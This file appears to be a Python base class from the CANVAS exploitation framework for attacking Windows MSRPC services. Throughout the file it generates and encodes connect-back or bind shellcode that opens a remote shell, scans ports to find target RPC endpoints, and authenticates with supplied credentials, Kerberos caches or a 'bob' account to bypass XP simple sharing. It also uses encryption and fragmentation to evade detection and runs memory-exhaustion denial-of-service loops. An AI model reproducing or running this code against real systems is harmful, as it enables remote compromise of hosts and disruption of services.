#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

"""Base class for msrpc exploits that require just one packet..."""

import os
import getopt
import sys
import socket
import time

if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from encoder import *
from tcpexploit import tcpexploit
from shellcode import shellcodeGenerator, win32shell
import canvasengine
from listenerLine import listenerLine
import libs.newsmb.libdcerpc as libdcerpc
from libs.newsmb.libsmb import assert_unicode
import libs.kerberos.ccache as cc

allnamedpipes=["\\spooler","\\lsarpc","\\srvsvc","\\epmapper","\\browser"]

class msrpcexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.UUID="" #the UUID I attack - all children should override me!
        self.uuidversion = ''
        self.covertness = 0
        self.port = 0
        self.host = "192.168.0.6"
        self.localhost = "192.168.0.2"
        self.localport = 5555
        self.targetfunction = 0
        self.version = 0
        self.badstring = "\x00\\/.:$"
        self.myDCE = None
        self.autoversion=0
        self.connectionList=[] #none to start, fill this in with buildConnectionList()
        self.subesp=0
        #subclasses to this class should not redefine the following variable
        #unless they change the shellcode!
        self.listenerArgsDict["fromcreatethread"]=1
        self.startservice=None #used locally to start a service
        self.getcontexthandle=None
        self.forceauth=0
        self.object=""
        self.runlocalhost=None #function to use on localhost, if set
        self.response=False
        self.needsNoShellcode=0
        self.sleeptime=8
        self.namedpipe=""
        self.success=0
        self.exhaustsize=100000 # size of memory to exhaust for memory exhaustion attacks like Exchange_DoS
        self.exhaustsizes= [1000000,20000000,30000000,2000000,500000000,20000,10,2000000,30000000,4000000,0xffffffffL,0x7fffffffL,0x7402030,0x3000000]
        self.exhaustsizes+= [50000,3000,2000,4096,10000,3000000,20000000,3000000,0x400000,0x100000,0x200000,0x500000,0xf0102030,0xf4040302]
        for x in range(0,40):
            self.exhaustsizes+=[4000000,0xffffffffL,0x7fffffffL,0x7402030,0x3000000]
        #string we use for add_knowledge, if necessary
        self.knowledgestring=None
        self.portscan=1 #by default, do a full portscan.
        self.use_universal=False
        self.ccache_file      = None
        self.use_kerberos     = False
        return

    def neededListenerTypes(self):
        if self.use_universal:
            return [canvasengine.UNIVERSAL_MOSDEF]
        else:
            return [canvasengine.WIN32MOSDEF]

    def am_bind_shellcode(self):
        """
        Returns true if we should use the bind shellcode
        """
        val = (self.callback.ip == "0.0.0.0")
        return val

    def createHeapShellcode(self):
        #for all of the exploits to prevent the heap corruption from disturbing us
        if self.callback==None:
            self.log("Cannot create heap shellcode without a callback...")

        host=self.callback.ip
        port=self.callback.port

        # switch into bind port mode on "0.0.0.0"
        if self.am_bind_shellcode():
            key=("WIN32 HEAP BIND", self.callback.port, self.badstring )
            sc = shellcodeGenerator.win32()
            sc.addAttr("findeipnoesp",{"subespval": 0x1000 })
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            sc.addAttr("BindMosdef", {"port" : self.callback.port })
            sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
            sc.addAttr("ExitThread", None)
            injectcode = sc.get()
            self.shellcode=self.createHeapSafeInjectIntoProcess(self.badstring,host,port,smallcode=0,injectme=injectcode)
        else:
            key = ("WIN32 HEAP CALLBACK", host, port, self.badstring)
            #if smallcode is zero, then use fromcreatethread if running from commandline.
            # defaults to LSASS.EXE and lsass.exe
            self.shellcode=self.createHeapSafeInjectIntoProcess(self.badstring,host,port,smallcode=0)

        return self.shellcode

    def createShellcode(self):
        """
        Creates either a bind or a callback shellcode, depending on settings
        """
        dobind=0
        if self.needsNoShellcode:
            return

        if self.callback==None:
            self.log("Cannot create callback shellcode without a callback...")
            self.log("Using bind shellcode instead...hope that's what you wanted!")
            self.callback=listenerLine("win32bind",0,None,None,None,self.log,None)
            dobind=1
            self.callback.port=0
            port=self.callback.port

        host=self.callback.ip
        port=self.callback.port
        sc = shellcodeGenerator.win32()

        if dobind or self.am_bind_shellcode(): # switch into BindMosdef mode
            #you can't use the same port twice (because bindshell doesn't exit properly)
            if port==0:
                #pick a random port now...
                random.seed(os.getpid())
                port=random.randint(1,65534)
                self.callback.port=port
                self.log("Picked random port %d"%port)
            key=("MSRPC BIND", self.subesp, host, port, self.badstring)
            self.log("Creating shellcode to BindMosdef to %s:%s"%(host,port))
            sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            sc.addAttr("BindMosdef", {"port" : port})
            sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
            sc.addAttr("ExitThread",None)
        else:
            self.log("Creating shellcode to callback to %s:%s"%(host,port))
            key = ("MSRPC CALLBACK", self.subesp, port, host, self.badstring)
            sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            # ipv6 connectback support, transparent
            if ":" in str(host):
                sc.addAttr("IPv6ConnectBack", {"port" : str(port), "host" : str(host)})
            else:
                sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : host})
            if self.use_universal:
                mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL_FCT)
                mosdef_id=self.engine.getNewMosdefID(self)
                sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
            sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
            sc.addAttr("ExitThread",None)

        rawshellcode = sc.get()
        if self.badstring=="":
            #no bad characters? Great!
            self.shellcode=rawshellcode
            return 1

        self.log("Raw shellcode (before encoding) is %d bytes" % len(rawshellcode))
        #set up the shellcode
        #For testing purposes! (following line) Comment out for real use
        #rawshellcode=(badchartest(0,255,self.badstring)*50)[:len(rawshellcode)]
        #self.log("Last raw characters: %s"%prettyhexprint(rawshellcode[-16:]))
        self.encodeshellcode(rawshellcode)
        self.log("Encoded shellcode length: %d" % len(self.shellcode))
        #self.log("Last encoded characters: %s"%prettyhexprint(self.shellcode[-16:]))
        return 1

    def encodeshellcode(self,rawshellcode):
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        #these are the characters not allowed by the exploit
        encoder.setbadstring(self.badstring)

        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode=encoder.encode(rawshellcode)
        self.log( "Done encoding shellcode.")
        if shellcode=="":
            self.log( "Could not encode shellcode")
            self.result_error=self.ERR_NO_SHELLCODE
            return 0
        #debug int
        #shellcode="\xcc"+shellcode
        self.shellcode=shellcode
        return self.shellcode

    def searchifids(self):
        "generate our connectionList from ifids list"
        self.connectionList=[]
        ret=self.exploitnodes("dcedump")[0]

        if ret==None:
            ret=[]

        for result in ret:
            #search through the list of results
            if result.isUUID(self.UUID) and result.isRemote():
                #found an endpoint for our UUID
                self.connectionList += [result.getendpoint(self.host)]

        if self.connectionList!=[]:
            self.log("Found a remote endpoint in dcedump, using that...")
            self.log("Endpoint found: %s"%self.connectionList)
            return self.connectionList

        #knowledge primitive
        ifidsknown=self.target.get_knowledge("ifids",None)
        if ifidsknown==None:
            if self.engine:
                if self.portscan:
                    # rather large portscan
                    ranges=[(130,2048)]
                else:
                    #some very small range of ports to scan
                    ranges=[(135,140),(445,446),(1025,1030)]
                portscanner=self.engine.getModuleExploit("portscan")
                portscanner.link(self)
                allports=[]
                self.log("MSRPC Exploit scanning: %s"%(ranges))
                for r in ranges:
                    allports+=range(r[0],r[1])
                portscanner.argsDict["mode"]="Custom Range"
                portscanner.argsDict["allports"]=allports
                portscanner.argsDict["postscan"]="ifids"
                portscanner.argsDict["UUID"]=self.UUID
                ret=portscanner.run()
                if portscanner.UUIDfound:
                    #we found our ifid!
                    port=int(portscanner.UUIDfound)
                    self.log("Found our UUID on port %d"%port)
                    if portscanner.namedpipe: #named pipe ports
                        self.log("Using named pipe %s"%portscanner.namedpipe)
                        self.connectionList += ["ncacn_np:%s[%s]"% (self.host,portscanner.namedpipe)]
                    else:
                        self.connectionList += ["ncacn_ip_tcp:%s[%d]"% (self.host,port)]

                return self.connectionList


                #ifidsknown=self.target.get_knowledge("ifids",None)
                #if ifidsknown in [None,[]]:
                #    return []
            else:
                return []

        #get list from that
        ifidslist=ifidsknown.known
        for item in ifidslist:
            ifid=item[2]
            version=item[3]
            if unicode(ifid) == assert_unicode(self.UUID):
                if version==self.uuidversion:
                    #found the endpoint!
                    cL=item[1]
                    self.log("Found endpoint in stored ifids list %s"%cL)
                    self.connectionList=cL


        if self.connectionList==[]:
            self.log("Did not find: %s version: %s in: %s" % (self.UUID, self.uuidversion, ifidslist))
            self.log("Didn't find endpoint. Perhaps you need to portscan with ifids option on")

        return self.connectionList

    def buildTCPConnectionList(self):
        """
        Specify endpoints for the attack
        """
        if self.connectionList!=[]:
            return self.connectionList
        if self.port==0:
            #else generate
            self.searchifids()
        else:
            #user specified
            if self.namedpipe and self.port in [139,445]:
                self.connectionList += ["ncacn_np:%s[%s]"% (self.host,self.namedpipe)]
            else:
                #tcp, I assume
                self.connectionList += ["ncacn_ip_tcp:%s[%d]"% (self.host,self.port)]
        self.log("Connection list=%s"%repr(self.connectionList))
        return self.connectionList


    def test(self):
        self.getargs()
        if self.startservice:
            self.startservice()

        if hasattr(self, "testOS"):
            ret=self.testOS()
        else:
            self.result_error=self.ERR_NO_VERSION
            self.log("OSDETECT not available...")
            return 0

        if not ret:
            self.log("TestOS did not return...target will not be attacked - version returned: %d"%self.version)
            return 0

        if self.connect():
            self.port = self.myDCE.dcerpc_connection.port
            return 1

        self.result_error=self.ERR_COULD_NOT_CONNECT
        self.log("test failed")
        return 0

    def buildConnectionList(self):
        self.connectionList=[]
        return []

    def testOS(self):
        """Sets the version properly, if possible"""
        #we default to "True" here because by default we do nothing...which always succeeds
        return True

    def check_ccache_file(self):
        try:
            # Can we open the credential file?
            cc1 = cc.CCache()
            cc1.open(self.ccache_file, new=0)
            # Is the DB related to the username?
            principal = cc1.get_primary_principal()
            user_domain = '@'.join([self.user,self.domain]).lower()
            if user_domain != principal.lower():
                return False

            # Do we have credential information that is not only configuration?
            creds = cc1.get_credentials()
            found_valid_creds = 0
            for cred in creds:
                if not cred.is_config_credential():
                    found_valid_creds = 1
            if not found_valid_creds:
                return False
            else:
                return True
        except Exception as e:
            return False
        else:
            return True

    def connect(self):
        #connect DCE pipe
        connectionList =  self.buildConnectionList()
        devlog('msrpcexploit::connect', "connectionList: %s" % connectionList)

        self.myDCE = None
        res        = None
        auth_type  = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
        auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY

        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")

        frag_level = None
        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation')
            frag_level = 2

        if self.ccache_file and self.check_ccache_file():
            self.use_kerberos = True

        for i in connectionList:
            res = None
            try:
                self.myDCE = libdcerpc.DCERPC(i,
                                              getsock=self,
                                              username=self.user,
                                              password=self.password,
                                              domain=self.domain,
                                              kerberos_db=self.ccache_file,
                                              use_krb5=self.use_kerberos,
                                              frag_level=frag_level)
                res = self.myDCE.bind(self.UUID, self.uuidversion, auth_type=auth_type, auth_level=auth_level)
            except libdcerpc.DCERPCException, msg:
                self.log(msg)
            if res:
                break

        if not res:
            self.log("Trying to connect with user \"bob\" to bypass XP simple sharing")
            for i in connectionList:
                try:
                    self.myDCE = libdcerpc.DCERPC(i, getsock=self, username="bob", password=self.password, frag_level=frag_level)
                    res = self.myDCE.bind(self.UUID, self.uuidversion, auth_type=auth_type, auth_level=auth_level)
                except libdcerpc.DCERPCException, msg:
                    self.log(msg)
                if res:
                    break

        if not res:
            self.log("Could not connect to remote server - service is not running or the host is firewalled.")
            self.result_error=self.ERR_COULD_NOT_CONNECT
            return 0

        self.log("MSRPC exploit attacking %s" % res)
        return 1

    def parseResponse(self, buf):
        """override this to parse your response"""
        return 0

    def parseException(self, msg):
        "handles any exceptions (such as failed DCE packet)"
        #default to fail
        return 0

    # heapIndex(base, size)   Oded's style
    # Get the offset to the Lookaside entry
    #  base -> base address of Lookaside
    #  size -> size of the Lookaside you are looking for
    #
    #  returns the virtual address of the entry
    def heapIndex(self, base, size):
        size += 0x0f
        size &= 0xfffffff8L
        size = size >> 3
        index = size*0x30
        index += 0x688
        index += base
        return index

    def getargs(self):
        self.host        = self.target.interface
        self.port        = int(self.argsDict.get("port",self.port))
        self.user        = self.argsDict.get("user",self.user)
        self.password    = self.argsDict.get("password",self.password)
        self.domain      = self.argsDict.get('domain', None)
        self.ccache_file = self.argsDict.get('krb5_ccache', None)
        self.namedpipe   = self.argsDict.get("namedpipe",self.namedpipe)
        self.portscan    = int(self.argsDict.get("portscan", self.portscan))
        self.portscan    = int(self.argsDict.get("portscan",self.portscan))
        if self.argsDict.has_key("passednodes") and len(self.argsDict["passednodes"]) > 0:
            self.node  = self.argsDict["passednodes"][0]
        else:
            self.node  = None

    def run(self):
        """
        Returns:
        1 (on sucessful callback), 0 (on failure), or CANVASNode instance (on successful bind/stole socket)
        """
        self.getargs()
        node = self.node

        self.setInfo("%s attacking %s:%d - (in progress)"% (self.name, self.host, self.port), showlog=True)

        #check to see if this is an information grabbing exploit and we already have
        #run it remotely
        if self.knowledgestring:
            kprim = self.target.get_knowledge(self.knowledgestring)
            #first check to see if we've already run this check!
            if kprim != None:
                #should we also if len(kprim)==1 ?
                self.result = kprim.known
                self.log("Already have %s in our knowledge tree - using %s"%(self.knowledgestring,self.result))
                self.setProgress(100)
                return 1

        if node and node.islocal(self.target.interface) and self.runlocalhost:
            self.log("Running an msrpc exploit on the local host!")
            if self.startservice:
                self.startservice()
            self.log("Calling runlocalhost()")
            ret=self.runlocalhost()
            self.log("Runlocalhost returned!")
            return ret

        self.log("%s attacking %s with version %d"%(self.name, self.target.interface, self.version))
        if self.version == 0:
            if not self.autoversion:
                self.log("Currently the exploit does not have support for autoversioning.\nPlease specify version.")
                self.setProgress(-1)
                return 0
            else:
                self.testOS()
                if self.version==0:
                    self.log("Couldn't automatically determine version!")
                    self.result_error=self.ERR_NO_VERSION
                    self.setProgress(-1)
                    return 0
        # connect
        try:
            ret=self.connect()
            if not ret:
                self.log("Could not connect!")
                self.setProgress(-1)
                return 0

            if self.getcontexthandle:
                ret=self.getcontexthandle()
                if not ret:
                    self.log("Could not get a context handle")
                    self.result_error=self.ERR_FAILED
                    self.setProgress(-1)
                    return 0

            self.setProgress(25)
            # get DCE pkt
            pkt = self.buildDcePacket()
            self.setProgress(50)
            self.log("Sending attack. Response = %s" % self.response)
            ret = self.myDCE.call(self.targetfunction, pkt, response=self.response)
            if self.response:
                self.parseResponse(self.myDCE.reassembled_data)

            self.log("Attack sent")
            self.setProgress(75)

        except self.error, msg:
            self.result_error=self.ERR_FAILED
            self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), showlog=True)
            self.log("Failed reason: %s" % str(msg))
            self.setProgress(-1)
            return 0
        except libdcerpc.DCERPCException, msg:
            if not self.parseException(str(msg)):
                self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), showlog=True)
                self.log("Failed reason: %s" % str(msg))
                self.setProgress(-1)

        self.log("Sleeping %s seconds so server can recover slightly" % self.sleeptime)
        time.sleep(self.sleeptime)
        self.log("Done sleeping %s seconds, checking for success..." % self.sleeptime)
        ret=1

        if not self.ISucceeded():
            ret=self.win32NonCallbackShellcodeCheck()
            if ret:
                self.result_error=self.SUCCESS
                self.success=1
                self.setProgress(100)
                return ret

        #self.target.add_knowledge("PrintProviders",self.result,100)
        if self.ISucceeded() or self.success:
            self.result_error=self.SUCCESS
            self.setInfo("%s attacking %s:%d (succeeded!)"%(self.name,self.host,self.port), showlog=True)
            self.log("%s done (succeeded!)"%self.name)
            self.setProgress(100)
            return 1


        self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port),
                     showlog=True)
        self.log("%s done (failed)"%self.name)
        self.result_error=self.ERR_FAILED
        self.setProgress(-1)
        return 0

    def buildDcePacket(self):
        #send nothing, function has no args
        return ""

    def run_exhaust_memory(self):
        """
        A varient of the run function that sends multiple attacks in an attempt to exhaust
        memory.

        Returns:
        1 (on sucessful callback), 0 (on failure), or CANVASNode instance (on successful bind/stole socket)
        """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.user=self.argsDict.get("user",self.user)
        self.password=self.argsDict.get("password",self.password)
        self.namedpipe=self.argsDict.get("namedpipe",self.namedpipe)
        node=self.argsDict["passednodes"][0]

        self.setInfo("%s attacking %s:%d - (in progress)"% (self.name, self.host, self.port), showlog=True)


        if self.version == 0:
            if not self.autoversion:
                self.log("Currently the exploit does not have support for autoversioning.\nPlease specify version.")
                return 0
            else:
                self.log("Exploit %s supports autoversion - running testOS()"%self.name)
                ret=self.testOS()
                self.log("testOS set version to %d"%self.version)
                if not ret or self.version==0:
                    self.log("Couldn't automatically determine version!")
                    self.result_error=self.ERR_NO_VERSION
                    return 0

        self.log("Exploit %s running as version %d"%(self.name, self.version))

        try:
            ret=self.connect()
        except:
            ret=0
        if not ret:
            self.log("Could not connect - not trying to memory exhaust")
            return 0

        # connect
        for self.exhaustsize in self.exhaustsizes:
            self.log("Sending memory request of %x"%self.exhaustsize)
            try:
                ret=self.connect()
                if not ret:
                    self.log("Could not connect - memory was exhausted!!")
                    return 1
                if self.getcontexthandle:
                    self.getcontexthandle()

                self.setProgress(25)
                # get DCE pkt
                pkt = self.buildDcePacket()
                self.setProgress(50)
                self.log("Sending attack. Response = %s"%self.response)
                ret = self.myDCE.call(self.targetfunction, pkt, response=self.response)

                if self.response:
                    self.parseResponse(self.myDCE.reassembled_data)

                self.log("Attack sent")
                self.setProgress(75)

            except self.error, msg:
                self.result_error=self.ERR_FAILED
                self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), showlog=True)
                self.log("Failed reason: %s" % str(msg))
                return 0

            except libdcerpc.DCERPCException, msg:
                if not self.parseException(str(msg)):
                    self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), showlog=True)
                    self.log("Failed reason: %s" % str(msg))

        self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port),
                     showlog=True)
        self.log("%s done (failed)"%self.name)
        self.result_error=self.ERR_FAILED
        return 0
